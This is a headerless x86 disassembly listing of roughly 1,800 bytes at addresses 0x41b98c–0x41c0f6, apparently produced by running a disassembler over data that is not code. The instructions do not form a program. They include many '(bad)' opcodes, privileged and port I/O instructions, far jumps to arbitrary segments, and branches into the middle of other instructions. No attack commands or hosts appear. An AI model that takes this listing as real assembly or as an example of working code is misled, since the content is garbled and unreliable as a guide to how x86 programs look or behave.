  41b98c:	jmp    0x9a10:0x65debe65
  41b993:	xor    eax,0x1bc8e8bb
  41b998:	jo     0x41b9ed
  41b99a:	jbe    0x41b9c3
  41b99c:	or     eax,0x45f9da5
  41b9a1:	rcr    DWORD PTR [ecx-0x1911366c],0xd7
  41b9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a9:	and    DWORD PTR [edx+0x30a729b7],0x7c82c62f
  41b9b3:	imul   esi,esi,0x6a
  41b9b6:	arpl   ax,dx
  41b9b8:	jmp    0xcf9c4b13
  41b9bd:	and    BYTE PTR [edx],bl
  41b9bf:	je     0x41b9bb
  41b9c1:	rcr    DWORD PTR [edx],cl
  41b9c3:	pop    esp
  41b9c4:	int3   
  41b9c5:	retf   
  41b9c6:	loop   0x41ba26
  41b9c8:	cli    
  41b9c9:	or     esi,ecx
  41b9cb:	push   cs
  41b9cc:	in     al,dx
  41b9cd:	fdiv   DWORD PTR [edi]
  41b9cf:	jne    0x41b9d8
  41b9d1:	loopne 0x41b992
  41b9d3:	out    dx,eax
  41b9d4:	or     edi,esi
  41b9d6:	xchg   edx,eax
  41b9d7:	dec    edi
  41b9d8:	add    esi,DWORD PTR [ebx-0x72bc4d62]
  41b9de:	rcr    esp,cl
  41b9e0:	mov    esi,ecx
  41b9e2:	scas   eax,DWORD PTR es:[edi]
  41b9e3:	add    DWORD PTR [esi],ebx
  41b9e5:	ror    DWORD PTR [ebp+0x368266c0],0xa1
  41b9ec:	pop    es
  41b9ed:	sbb    eax,0x68c91239
  41b9f2:	or     al,0xce
  41b9f4:	test   ah,0x27
  41b9f7:	push   edx
  41b9f8:	jb     0x41b9cf
  41b9fa:	or     edi,0xd
  41b9fd:	mov    ecx,cs
  41b9ff:	(bad)  
  41ba01:	jge    0x41ba2f
  41ba03:	sub    al,0x54
  41ba05:	lds    ebp,FWORD PTR [ebx]
  41ba07:	cwde   
  41ba08:	jnp    0x41ba0a
  41ba0a:	nop
  41ba0b:	aad    0x3e
  41ba0d:	mov    eax,0x1c0028a8
  41ba12:	inc    edx
  41ba13:	sbb    bx,WORD PTR [eax+eax*4-0x1]
  41ba18:	std    
  41ba19:	dec    esp
  41ba1a:	cdq    
  41ba1b:	pop    edx
  41ba1c:	xor    ebp,edx
  41ba1e:	ja     0x41b9e0
  41ba20:	or     edx,eax
  41ba22:	(bad)  [esi-0x148546be]
  41ba28:	sti    
  41ba29:	push   0xc840651b
  41ba2e:	or     dl,bh
  41ba30:	jg     0x41b9db
  41ba32:	iret   
  41ba33:	mov    al,0x40
  41ba35:	addr16 adc eax,0x19b1bb2e
  41ba3b:	mov    edx,ebp
  41ba3d:	outs   dx,DWORD PTR ds:[esi]
  41ba3e:	clc    
  41ba3f:	dec    ebx
  41ba40:	add    BYTE PTR [eax],dl
  41ba42:	inc    edx
  41ba43:	ds das 
  41ba45:	pop    esi
  41ba46:	imul   edi,DWORD PTR [esi-0x4d],0x46d21d8a
  41ba4d:	je     0x41ba4d
  41ba4f:	fwait
  41ba50:	xchg   edi,eax
  41ba51:	mov    eax,0x50aeee48
  41ba56:	sbb    DWORD PTR [esi+0x6e],esi
  41ba59:	fstp   DWORD PTR ds:0x636ae24d
  41ba5f:	stc    
  41ba60:	addr16 pop es
  41ba62:	mov    edi,0x6fbb2e9f
  41ba67:	outs   dx,DWORD PTR ds:[esi]
  41ba68:	xor    BYTE PTR [edi+esi*8+0x5c44585c],bl
  41ba6f:	retf   0x1a7f
  41ba72:	dec    ebp
  41ba73:	fcom   DWORD PTR [edx-0x32b5b5a7]
  41ba79:	ja     0x41badb
  41ba7b:	stc    
  41ba7c:	cli    
  41ba7d:	or     BYTE PTR [ecx],al
  41ba7f:	pop    esp
  41ba80:	addr16 mov dl,0x32
  41ba83:	inc    esi
  41ba84:	mov    dh,0xbd
  41ba86:	retf   0x93c5
  41ba89:	mov    eax,0x7f1a3d37
  41ba8e:	cld    
  41ba8f:	ja     0x41baec
  41ba91:	xchg   esi,eax
  41ba92:	xchg   ecx,eax
  41ba93:	mov    edx,0xd9cbd3ac
  41ba98:	mov    edi,0x1818a157
  41ba9d:	div    DWORD PTR [edi+0x67]
  41baa0:	pop    esi
  41baa1:	sub    DWORD PTR [eax+0x2d2c98bd],0x4938de54
  41baab:	shl    BYTE PTR [ebp+0x40],0x9e
  41baaf:	in     al,dx
  41bab0:	mov    ch,0xf5
  41bab2:	dec    edi
  41bab3:	test   al,0x4a
  41bab5:	fstp   DWORD PTR [edx+0x5c4fdc6e]
  41babb:	push   esp
  41babc:	xor    DWORD PTR [edx-0x60],0x38ec1961
  41bac3:	mov    ebx,0x82f0f61c
  41bac8:	dec    edi
  41bac9:	jge    0x41bb3f
  41bacb:	xlat   BYTE PTR ds:[ebx]
  41bacc:	xchg   esp,eax
  41bacd:	xchg   ecx,eax
  41bace:	jle    0x41bac5
  41bad0:	inc    esi
  41bad1:	rol    esi,cl
  41bad3:	imul   eax,DWORD PTR [ebp-0x42],0x6ebdc85c
  41bada:	rcr    DWORD PTR [eax-0x56],cl
  41badd:	dec    ecx
  41bade:	ja     0x41ba9c
  41bae0:	mov    DWORD PTR [esi+0x39],ecx
  41bae3:	xor    DWORD PTR [edx+0x6d23102f],edi
  41bae9:	stc    
  41baea:	test   al,0x60
  41baec:	or     ah,BYTE PTR [edx-0x5e2536d5]
  41baf2:	push   ebx
  41baf3:	rol    DWORD PTR [ebp+0x5d01dbdf],1
  41baf9:	ja     0x41bb2d
  41bafb:	xor    cl,dl
  41bafd:	jecxz  0x41bb33
  41baff:	ss jno 0x41ba83
  41bb02:	(bad)  
  41bb03:	repz stc 
  41bb05:	inc    ebx
  41bb06:	(bad)  
  41bb07:	in     eax,0x21
  41bb09:	mov    bh,0x41
  41bb0b:	mov    esi,0xfac58da0
  41bb10:	leave  
  41bb11:	retf   0x1ec0
  41bb14:	fwait
  41bb15:	jl     0x41bb55
  41bb17:	sub    ah,dh
  41bb19:	xchg   DWORD PTR [eax+0x3bf20e54],esp
  41bb1f:	out    0x54,al
  41bb21:	ror    BYTE PTR [edx+0x2f],1
  41bb24:	adc    DWORD PTR [esi-0x22],eax
  41bb27:	cli    
  41bb28:	repz inc edi
  41bb2a:	rcr    cl,1
  41bb2c:	xchg   ebp,eax
  41bb2d:	push   esi
  41bb2e:	dec    esi
  41bb2f:	dec    ebp
  41bb30:	dec    edx
  41bb31:	mov    esi,DWORD PTR [ebx+edx*8-0x6a]
  41bb35:	sub    esi,DWORD PTR [edi-0x39]
  41bb38:	inc    ecx
  41bb39:	xor    bh,ah
  41bb3b:	shr    DWORD PTR [edx-0x6b],1
  41bb3e:	jno    0x41bad2
  41bb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb41:	shl    DWORD PTR [esi-0x5d],0x5e
  41bb45:	xchg   edi,eax
  41bb46:	sub    DWORD PTR [eax],ebx
  41bb48:	aaa    
  41bb49:	xchg   esi,eax
  41bb4a:	jo     0x41bb5b
  41bb4c:	add    BYTE PTR [esi-0x547643dc],al
  41bb52:	push   ecx
  41bb53:	or     edx,DWORD PTR [ecx]
  41bb55:	fwait
  41bb56:	and    esi,edx
  41bb58:	xchg   ebx,eax
  41bb59:	inc    eax
  41bb5a:	in     eax,dx
  41bb5b:	test   eax,0xb92237e1
  41bb60:	sub    eax,0xcd19bac3
  41bb65:	jae    0x41bbbf
  41bb67:	inc    eax
  41bb68:	pop    ebx
  41bb69:	and    DWORD PTR [ebp+0x3c],eax
  41bb6c:	rol    ebx,1
  41bb6e:	cdq    
  41bb6f:	rcl    BYTE PTR [ebx],1
  41bb71:	sub    edx,DWORD PTR [edi-0x6a]
  41bb74:	(bad)  
  41bb75:	jnp    0x41bb59
  41bb77:	addr16 add dl,cl
  41bb7a:	adc    BYTE PTR [edi*4+0x7d4ef795],bl
  41bb81:	jbe    0x41bb41
  41bb83:	data16 fidiv DWORD PTR cs:[ecx-0x6b5a0f6]
  41bb8b:	push   esp
  41bb8c:	imul   esp,DWORD PTR [ebx],0xb45e91da
  41bb92:	push   ebx
  41bb93:	(bad)
  41bb96:	stc    
  41bb97:	dec    edx
  41bb98:	pop    eax
  41bb99:	or     cl,BYTE PTR [eax+0x54]
  41bb9c:	gs push cs
  41bb9e:	push   ds
  41bb9f:	sar    esp,0x3
  41bba2:	jl     0x41bbb5
  41bba4:	bound  ebp,QWORD PTR [edi+0x34]
  41bba7:	mov    bl,0x4d
  41bba9:	ins    DWORD PTR es:[edi],dx
  41bbaa:	sub    eax,0x82a2ccb7
  41bbaf:	stos   BYTE PTR es:[edi],al
  41bbb0:	xor    ch,bh
  41bbb2:	xchg   ebp,eax
  41bbb3:	fimul  WORD PTR [edi-0x16e16a20]
  41bbb9:	mov    dl,BYTE PTR [esi+0x15]
  41bbbc:	sub    eax,0x91b46d5d
  41bbc1:	outs   dx,BYTE PTR ds:[esi]
  41bbc2:	xor    eax,0x33aa5bb7
  41bbc7:	jmp    0x538b8ce5
  41bbcc:	push   cs
  41bbcd:	shl    DWORD PTR [edx+0x6081b61f],1
  41bbd3:	ret    
  41bbd4:	xchg   edi,eax
  41bbd5:	in     al,dx
  41bbd6:	out    dx,al
  41bbd7:	mov    dl,0xd4
  41bbd9:	dec    edi
  41bbda:	inc    esi
  41bbdc:	call   0x5fc3:0xc025c98c
  41bbe3:	push   es
  41bbe4:	cmc    
  41bbe5:	hlt    
  41bbe6:	mov    ebp,0x3feb43f
  41bbeb:	dec    edi
  41bbec:	pop    ds
  41bbed:	ins    DWORD PTR es:[edi],dx
  41bbee:	sub    edi,0xffffff90
  41bbf1:	mov    ch,0xe8
  41bbf3:	sbb    al,0xfb
  41bbf5:	test   BYTE PTR [edi-0x54],dh
  41bbf8:	(bad)  
  41bbfa:	adc    ah,al
  41bbfc:	shl    DWORD PTR [eax-0x66e72cf5],1
  41bc02:	enter  0x806d,0xc9
  41bc06:	xchg   ebp,eax
  41bc07:	cli    
  41bc08:	outs   dx,BYTE PTR ds:[esi]
  41bc09:	mov    BYTE PTR [esi+0x5c7e3c87],0x5e
  41bc10:	in     eax,dx
  41bc11:	and    ebp,DWORD PTR ds:0xdfaf07a8
  41bc17:	push   es
  41bc18:	das    
  41bc19:	aaa    
  41bc1a:	pop    edi
  41bc1b:	adc    al,0xdb
  41bc1d:	fisub  WORD PTR ds:0xa40349b3
  41bc23:	test   eax,0xc1e1e643
  41bc28:	call   0xa006:0x9d574985
  41bc2f:	xchg   esi,eax
  41bc30:	test   DWORD PTR [ebp+0x47],esp
  41bc33:	ins    DWORD PTR es:[edi],dx
  41bc34:	mov    ch,0x11
  41bc36:	cdq    
  41bc37:	inc    ebx
  41bc38:	hlt    
  41bc39:	jbe    0x41bc95
  41bc3b:	jo     0x41bca4
  41bc3d:	iret   
  41bc3e:	mov    BYTE PTR [edx-0x23],dh
  41bc41:	les    edi,FWORD PTR [ecx+0x69]
  41bc44:	sbb    bh,BYTE PTR [ecx-0x61]
  41bc47:	xor    al,0xc9
  41bc49:	clc    
  41bc4a:	jbe    0x41bc68
  41bc4c:	fs int 0x9a
  41bc4f:	iret   
  41bc50:	retf   
  41bc51:	in     al,dx
  41bc52:	stc    
  41bc53:	dec    eax
  41bc54:	dec    ecx
  41bc55:	das    
  41bc56:	icebp  
  41bc57:	clc    
  41bc58:	jl     0x41bbdc
  41bc5a:	loop   0x41bbe3
  41bc5c:	aaa    
  41bc5d:	call   DWORD PTR [esp+esi*2-0x6e62a201]
  41bc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc65:	icebp  
  41bc66:	cmp    BYTE PTR [ebp-0x2d],0x32
  41bc6a:	arpl   WORD PTR [eax-0x57a9e94a],dx
  41bc70:	adc    BYTE PTR [edx],bl
  41bc72:	push   ss
  41bc73:	mov    ebx,0x681930d
  41bc78:	xchg   ebx,eax
  41bc79:	mov    dl,0x3d
  41bc7b:	xor    al,BYTE PTR [eax+0x3e]
  41bc7e:	mov    dh,0x1e
  41bc80:	out    0xf3,eax
  41bc82:	test   eax,0xd1cdcc81
  41bc87:	push   esp
  41bc88:	das    
  41bc89:	pop    ss
  41bc8a:	inc    edi
  41bc8b:	scas   eax,DWORD PTR es:[edi]
  41bc8c:	jge    0x41bcd5
  41bc8e:	push   esp
  41bc8f:	enter  0x6e7c,0x7
  41bc93:	jno    0x41bce4
  41bc95:	jge    0x41bc38
  41bc97:	pop    ebp
  41bc98:	aas    
  41bc99:	addr16 jns 0x41bcb8
  41bc9c:	xchg   edx,eax
  41bc9d:	mov    ah,0x81
  41bc9f:	pop    ss
  41bca0:	jno    0x41bc3c
  41bca2:	pop    es
  41bca3:	jl     0x41bd12
  41bca5:	xchg   edi,eax
  41bca6:	arpl   WORD PTR [ecx],si
  41bca8:	xchg   edi,eax
  41bca9:	das    
  41bcaa:	loope  0x41bd27
  41bcac:	xchg   DWORD PTR [edx-0x7bc5a31],edx
  41bcb2:	pop    ds
  41bcb3:	adc    bh,BYTE PTR es:[ebp+ebp*2-0x77]
  41bcb8:	mov    ch,0xb1
  41bcba:	retf   0xb70a
  41bcbd:	push   ds
  41bcbe:	les    esi,FWORD PTR [edx+eax*1+0x23822e26]
  41bcc5:	stc    
  41bcc6:	or     BYTE PTR [esi+0x30],ch
  41bcc9:	test   DWORD PTR [esi],edi
  41bccb:	jae    0x41bd02
  41bccd:	mov    ecx,0xde27d093
  41bcd2:	mov    al,ds:0x94b7809c
  41bcd7:	test   DWORD PTR [eax-0x57],edx
  41bcda:	dec    esi
  41bcdb:	out    0x8f,eax
  41bcdd:	(bad)  
  41bcde:	pusha  
  41bcdf:	or     edi,eax
  41bce1:	xor    DWORD PTR [edi+0x76],esi
  41bce4:	inc    esp
  41bce5:	imul   esp,DWORD PTR [ecx-0x714edac9],0xdb656db2
  41bcef:	xor    BYTE PTR [eax],dh
  41bcf1:	push   cs
  41bcf2:	jns    0x41bcb5
  41bcf4:	daa    
  41bcf5:	xlat   BYTE PTR ds:[ebx]
  41bcf6:	lea    esi,[edi-0x36]
  41bcf9:	jg     0x41bca7
  41bcfb:	jno    0x41bca0
  41bcfd:	lahf   
  41bcfe:	fbld   TBYTE PTR [esi-0x2c]
  41bd01:	loop   0x41bc9e
  41bd03:	mov    ds:0xe906ecda,eax
  41bd08:	call   0x3519:0xdfb87cc
  41bd0f:	je     0x41bccf
  41bd11:	jns    0x41bcee
  41bd13:	mov    eax,0xac356b5
  41bd18:	jg     0x41bce4
  41bd1a:	int    0x57
  41bd1c:	dec    esi
  41bd1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd1e:	stos   DWORD PTR es:[edi],eax
  41bd1f:	pop    esp
  41bd20:	push   ebx
  41bd21:	clc    
  41bd22:	repnz fwait
  41bd24:	and    al,0x5
  41bd26:	inc    ebp
  41bd27:	adc    DWORD PTR ds:0x22c0deb4,esp
  41bd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2e:	adc    eax,0x443988e6
  41bd33:	mov    WORD PTR [edx],ds
  41bd35:	rcr    BYTE PTR ss:[esi],cl
  41bd38:	clc    
  41bd39:	cmp    bh,0x54
  41bd3c:	jecxz  0x41bd3f
  41bd3e:	pop    esp
  41bd3f:	pop    eax
  41bd40:	scas   eax,DWORD PTR es:[edi]
  41bd41:	fcmovne st,st(3)
  41bd43:	into   
  41bd44:	rcr    BYTE PTR [eax-0x48e49395],cl
  41bd4a:	add    dl,BYTE PTR [ecx+0x2f0025e4]
  41bd50:	ret    
  41bd51:	ja     0x41bce6
  41bd53:	push   ebx
  41bd54:	push   edx
  41bd55:	dec    edx
  41bd56:	outs   dx,BYTE PTR ds:[esi]
  41bd57:	iret   
  41bd58:	(bad)  
  41bd5a:	xor    esp,esi
  41bd5c:	test   BYTE PTR [edx+0x185ad9fc],ah
  41bd62:	fwait
  41bd63:	mov    dh,0x47
  41bd65:	cmp    al,0x2d
  41bd67:	jge    0x41bd10
  41bd69:	mov    DWORD PTR [ebp+eiz*4-0x6b0bf350],esp
  41bd70:	pop    ebp
  41bd71:	fcomip st,st(2)
  41bd73:	aas    
  41bd74:	jecxz  0x41bd23
  41bd76:	adc    esi,DWORD PTR [ecx]
  41bd78:	repnz out 0x4b,al
  41bd7b:	and    ebx,edi
  41bd7d:	not    BYTE PTR [edi-0x4f]
  41bd80:	xor    al,0x5d
  41bd82:	or     BYTE PTR [ecx-0x2c],0xae
  41bd86:	cmc    
  41bd87:	bound  esi,QWORD PTR [ecx-0x13]
  41bd8a:	dec    ebx
  41bd8b:	shl    DWORD PTR [eax+eiz*8-0x324cd4c8],0x20
  41bd93:	(bad)  
  41bd95:	pop    ss
  41bd96:	add    DWORD PTR ds:0xb945d763,esp
  41bd9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd9d:	xor    DWORD PTR [ebp-0x5f14f728],eax
  41bda3:	cmp    ebx,DWORD PTR [edx]
  41bda5:	cdq    
  41bda6:	ins    DWORD PTR es:[edi],dx
  41bda7:	xlat   BYTE PTR ds:[ebx]
  41bda8:	push   0x511f8052
  41bdad:	pop    es
  41bdae:	push   es
  41bdaf:	mov    ds:0x99124bf9,al
  41bdb4:	mov    dh,0x91
  41bdb6:	scas   eax,DWORD PTR es:[edi]
  41bdb7:	pusha  
  41bdb8:	inc    ebx
  41bdb9:	sti    
  41bdba:	xor    ebx,ebp
  41bdbc:	mov    ch,0x2c
  41bdbe:	pusha  
  41bdbf:	es sbb eax,ebx
  41bdc2:	push   edx
  41bdc3:	add    BYTE PTR [ebx],cl
  41bdc5:	adc    DWORD PTR [esi],esp
  41bdc7:	or     dl,BYTE PTR [ebp+esi*4+0x4e2339d5]
  41bdce:	mov    ds:0x359e14c0,eax
  41bdd3:	(bad)  
  41bdd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdd5:	inc    edi
  41bdd6:	(bad)  
  41bdd8:	rcl    ebx,cl
  41bdda:	lods   al,BYTE PTR ds:[esi]
  41bddb:	dec    ebp
  41bddc:	out    0x7c,al
  41bdde:	mov    ebp,ebx
  41bde0:	add    edx,eax
  41bde2:	push   ss
  41bde3:	xor    BYTE PTR [edx+0x12],cl
  41bde6:	call   0x17ba:0x17bcd7f9
  41bded:	jmp    0x41be65
  41bdef:	jl     0x2aef3705
  41bdf5:	pop    ebx
  41bdf6:	out    dx,al
  41bdf7:	lahf   
  41bdf8:	xor    BYTE PTR [ebx],ch
  41bdfa:	data16 jl 0x41bdfa
  41bdfd:	xor    al,0xbe
  41bdff:	aam    0xba
  41be01:	xor    ebp,eax
  41be03:	mov    ebp,0x5c7fa0f2
  41be08:	ror    esi,1
  41be0a:	cmp    eax,esp
  41be0c:	or     DWORD PTR [ecx-0x6e],0x56
  41be10:	pop    edi
  41be11:	mov    eax,ds:0xffb95344
  41be16:	rcl    DWORD PTR [esp+ebp*2-0xbc781db],0x40
  41be1e:	push   cs
  41be1f:	add    edi,DWORD PTR [eax+0x4e]
  41be22:	outs   dx,DWORD PTR ds:[esi]
  41be23:	loope  0x41be20
  41be25:	jg     0x41be37
  41be27:	and    edx,eax
  41be29:	sbb    eax,0x5bf1583d
  41be2e:	push   cs
  41be2f:	mov    DWORD PTR [edx+0x52],esp
  41be32:	mov    dl,0x38
  41be34:	mov    al,0xab
  41be36:	xor    BYTE PTR [edx+0x174f552a],ah
  41be3c:	or     eax,0x45a29e94
  41be41:	jno    0x41bddd
  41be43:	push   esi
  41be44:	in     eax,dx
  41be45:	mov    al,ds:0xb51c684c
  41be4a:	add    BYTE PTR [edi+0x13d5d3ce],bh
  41be50:	xchg   dl,cl
  41be52:	jnp    0x41be0f
  41be54:	sbb    edx,DWORD PTR [ebp+0x32]
  41be57:	es out 0x76,eax
  41be5a:	jne    0x41be70
  41be5c:	adc    bl,0xe0
  41be5f:	inc    ecx
  41be60:	cs mov esp,0x6f3b694e
  41be66:	ss push sp
  41be69:	in     eax,0x54
  41be6b:	push   ecx
  41be6c:	ja     0x41be01
  41be6e:	jb     0x41be36
  41be70:	xor    DWORD PTR [ebx-0x44208a78],esp
  41be76:	jg     0x41bedd
  41be78:	mov    al,0x6e
  41be7b:	test   BYTE PTR [edi],dl
  41be7d:	outs   dx,DWORD PTR ds:[esi]
  41be7e:	iret   
  41be7f:	fild   WORD PTR [eax]
  41be81:	mov    cl,0x7c
  41be83:	push   ds
  41be84:	aas    
  41be85:	call   0xdf91dfeb
  41be8a:	rol    dl,1
  41be8c:	cmp    al,0x51
  41be8e:	ret    0xaaac
  41be91:	scas   al,BYTE PTR es:[edi]
  41be92:	test   al,0x24
  41be94:	dec    eax
  41be95:	dec    esi
  41be96:	mov    ebp,ecx
  41be98:	arpl   WORD PTR [edx+0x4],di
  41be9b:	test   eax,0x482435ca
  41bea0:	test   al,0xdb
  41bea2:	jmp    0x41bece
  41bea4:	mov    DWORD PTR [edx+0x522b5d11],ebx
  41beaa:	pop    esi
  41beab:	rol    bl,cl
  41bead:	jbe    0x41bf1a
  41beaf:	add    eax,0x7e9da67e
  41beb4:	add    al,0x7d
  41beb6:	mov    esi,DWORD PTR [esi]
  41beb8:	mov    edi,0xe501e797
  41bebd:	fsubr  DWORD PTR [ebx]
  41bebf:	retf   0x3967
  41bec2:	test   DWORD PTR [edi],ebx
  41bec4:	shl    BYTE PTR [edx-0x2e],1
  41bec7:	stc    
  41bec8:	call   0x5a16:0x27f7b0a2
  41becf:	aam    0x76
  41bed1:	xchg   BYTE PTR [esi+edx*8-0x609aac15],bl
  41bed8:	jmp    0x41be95
  41beda:	add    DWORD PTR [edx-0x7bd8977a],eax
  41bee0:	pop    ss
  41bee1:	and    al,cl
  41bee3:	adc    al,0xb8
  41bee5:	jecxz  0x41bf13
  41bee7:	mov    esi,0xe96d3350
  41beec:	lahf   
  41beed:	mov    ch,0x3d
  41beef:	push   eax
  41bef0:	adc    al,BYTE PTR [edx+0x18]
  41bef3:	dec    ecx
  41bef4:	and    bh,BYTE PTR [ecx]
  41bef6:	jecxz  0x41bef8
  41bef8:	push   es
  41bef9:	cs sti 
  41befb:	call   0x812d6506
  41bf00:	mov    al,0x9d
  41bf02:	mov    edi,0x7a6e3b60
  41bf07:	sbb    al,0x1f
  41bf09:	dec    edx
  41bf0a:	aam    0x4d
  41bf0c:	ficom  WORD PTR [edi+0x4b1d20c8]
  41bf12:	cwde   
  41bf13:	stc    
  41bf14:	and    esp,DWORD PTR [ebx+0x77278749]
  41bf1a:	clc    
  41bf1b:	test   eax,0xe13569b8
  41bf20:	pushf  
  41bf21:	into   
  41bf22:	or     al,0xcc
  41bf24:	mov    ebx,0xf5acf385
  41bf29:	outs   dx,DWORD PTR ds:[esi]
  41bf2a:	aam    0x7
  41bf2c:	mov    esp,0xbc02646d
  41bf31:	pop    esp
  41bf32:	test   BYTE PTR [esi-0x1c],dl
  41bf35:	scas   eax,DWORD PTR es:[edi]
  41bf36:	inc    ecx
  41bf37:	mov    al,0xb7
  41bf39:	xor    DWORD PTR [ecx+0x3614948a],0x22
  41bf40:	pop    es
  41bf41:	add    BYTE PTR [eax-0x4054ae8e],ah
  41bf47:	jno    0x41bf60
  41bf49:	jb     0x41bf5a
  41bf4b:	loop   0x41bee0
  41bf4d:	jg     0x41bf67
  41bf4f:	loopne 0x41bf7e
  41bf51:	dec    eax
  41bf52:	sbb    esi,ecx
  41bf54:	mov    edi,0x3b21711e
  41bf59:	inc    esp
  41bf5a:	pop    esi
  41bf5b:	jg     0x41bfb3
  41bf5d:	mov    bl,0x6b
  41bf5f:	repnz push esp
  41bf61:	in     eax,0x4f
  41bf63:	lods   eax,DWORD PTR ds:[esi]
  41bf64:	sahf   
  41bf65:	jp     0x41bf74
  41bf67:	in     al,dx
  41bf68:	mov    ah,0xcf
  41bf6a:	sub    DWORD PTR [ebp+0x6e],eax
  41bf6d:	xchg   esi,eax
  41bf6e:	cmp    DWORD PTR [edi],esi
  41bf70:	jg     0x41bf9a
  41bf72:	inc    ecx
  41bf73:	push   0x1733164f
  41bf78:	jno    0x41bf2a
  41bf7a:	sub    ecx,esi
  41bf7c:	cwde   
  41bf7d:	pop    es
  41bf7e:	jne    0x41bf3c
  41bf80:	inc    esp
  41bf81:	fldcw  WORD PTR [ecx+0x1e]
  41bf84:	in     al,0x5c
  41bf86:	scas   al,BYTE PTR es:[edi]
  41bf87:	pop    edi
  41bf88:	stos   BYTE PTR es:[edi],al
  41bf89:	pop    ebx
  41bf8a:	dec    edx
  41bf8b:	fst    st(7)
  41bf8d:	out    0xfd,al
  41bf8f:	dec    edx
  41bf90:	xchg   ebx,eax
  41bf91:	sub    al,0xdd
  41bf93:	in     al,dx
  41bf94:	jg     0x41bfe5
  41bf96:	push   ds
  41bf97:	xchg   ecx,eax
  41bf98:	lods   eax,DWORD PTR ds:[esi]
  41bf99:	mov    edi,0x3f0281cb
  41bf9e:	(bad)  
  41bf9f:	cmc    
  41bfa0:	inc    DWORD PTR [edi+0x3b174b38]
  41bfa6:	fs fchs 
  41bfa9:	mov    WORD PTR [bx+0x56],ss
  41bfad:	mov    dh,0xe1
  41bfaf:	mov    al,0x34
  41bfb1:	push   esi
  41bfb2:	cmp    BYTE PTR [esi-0x48a9ebea],ch
  41bfb8:	sub    dh,BYTE PTR [ebx]
  41bfba:	dec    edx
  41bfbb:	shr    DWORD PTR [esi],1
  41bfbd:	in     al,dx
  41bfbe:	aas    
  41bfbf:	add    BYTE PTR [edx+0x76],bh
  41bfc2:	add    eax,0x623fbc1
  41bfc7:	outs   dx,DWORD PTR ds:[esi]
  41bfc8:	mov    al,al
  41bfca:	dec    ecx
  41bfcb:	daa    
  41bfcc:	out    0x0,eax
  41bfce:	sub    DWORD PTR [esi+0xfd25323],eax
  41bfd4:	aad    0xf
  41bfd6:	jnp    0x41bfc7
  41bfd8:	or     al,0x9e
  41bfda:	fistp  DWORD PTR [edi-0x253e3c4d]
  41bfe0:	cli    
  41bfe1:	inc    BYTE PTR [ecx+0x7a]
  41bfe4:	mov    ds:0x16affe37,eax
  41bfe9:	mov    cl,0xe7
  41bfeb:	std    
  41bfec:	retf   0x472f
  41bfef:	ficom  DWORD PTR [ecx+0x51]
  41bff2:	in     eax,dx
  41bff3:	aam    0x8a
  41bff5:	mov    dl,0xe
  41bff7:	aaa    
  41bff8:	lahf   
  41bff9:	mov    ecx,0x3d34dfbd
  41bffe:	push   edi
  41bfff:	push   ebx
  41c000:	add    dl,BYTE PTR [esi-0x1cacd6e4]
  41c006:	fisubr DWORD PTR [ebx]
  41c008:	addr16 js 0x41c06c
  41c00b:	pop    ebx
  41c00c:	pop    ebp
  41c00d:	add    edi,DWORD PTR [eax-0x50464143]
  41c013:	ds out 0xa6,al
  41c016:	cmp    ch,dl
  41c018:	sbb    eax,0xfe542b4b
  41c01d:	xor    BYTE PTR [edi+esi*4],0xc3
  41c021:	pusha  
  41c022:	mov    ebp,0xb94e19b5
  41c027:	xchg   BYTE PTR [eax],bl
  41c029:	sbb    DWORD PTR [edi],ecx
  41c02b:	and    al,0xbe
  41c02d:	fstp   TBYTE PTR [edi+0x68]
  41c030:	fdivr  st(0),st
  41c032:	cmp    cl,BYTE PTR [eax+0x2f33ceb6]
  41c038:	inc    eax
  41c039:	test   BYTE PTR [edx+0x42a8239c],dh
  41c03f:	push   esi
  41c040:	xor    eax,0xe8bedbb5
  41c045:	mov    edi,0xc63821e7
  41c04a:	es femms 
  41c04d:	into   
  41c04e:	pop    ss
  41c04f:	imul   edx,DWORD PTR [esp+edi*1],0xd94d310
  41c056:	xchg   edx,eax
  41c057:	mov    dl,0x75
  41c059:	pop    ecx
  41c05a:	sbb    esi,ebp
  41c05c:	into   
  41c05d:	add    al,bh
  41c05f:	cmp    bh,ch
  41c061:	hlt    
  41c062:	ins    BYTE PTR es:[edi],dx
  41c063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c064:	dec    edi
  41c065:	jg     0x8d8bcf1c
  41c06b:	test   DWORD PTR [ebx],0x972d7dd3
  41c071:	or     eax,0x13c61531
  41c076:	jp     0x41c038
  41c078:	ret    0xe164
  41c07b:	iret   
  41c07c:	rcl    DWORD PTR [edx+0x12d2c298],cl
  41c082:	sub    DWORD PTR [edx+0x4a436504],ebx
  41c088:	nop
  41c089:	and    al,0xf9
  41c08c:	jnp    0x41c042
  41c08e:	dec    edx
  41c08f:	out    0x1f,al
  41c091:	sbb    al,0xd1
  41c093:	enter  0xde86,0x4
  41c097:	mov    ch,0x6d
  41c099:	lea    ebx,[ebp+0x2f81e1c2]
  41c09f:	inc    edx
  41c0a0:	(bad)  
  41c0a1:	sbb    eax,0x6831f2b6
  41c0a6:	jle    0x41c02a
  41c0a8:	imul   edx,DWORD PTR [ebp+0xe68796],0x2b563b70
  41c0b2:	fnsave [ecx+0x4e]
  41c0b5:	jnp    0x41c126
  41c0b7:	sub    eax,edi
  41c0b9:	sbb    BYTE PTR [edi+0x14],ch
  41c0bc:	ss rdmsr 
  41c0bf:	mov    eax,ds:0xbe3b07f7
  41c0c4:	lock retf 0x7ad1
  41c0c8:	inc    edx
  41c0c9:	(bad)
  41c0cd:	push   cs
  41c0ce:	xchg   ebx,eax
  41c0cf:	pop    edx
  41c0d0:	cwde   
  41c0d1:	mov    ecx,0x97cb3c6e
  41c0d6:	cdq    
  41c0d7:	jmp    0x5d272770
  41c0dc:	(bad)  
  41c0dd:	xor    edx,DWORD PTR [ecx-0x236e50c2]
  41c0e3:	mul    cl
  41c0e5:	mov    ebx,0x5ca7f7dc
  41c0ea:	adc    eax,0x3a2fb2e
  41c0ef:	push   es
  41c0f0:	cwde   
  41c0f1:	jae    0x41c15b
  41c0f3:	push   ds
  41c0f4:	adc    al,0xb5
  41c0f6:	xor    esi,0xffffffde
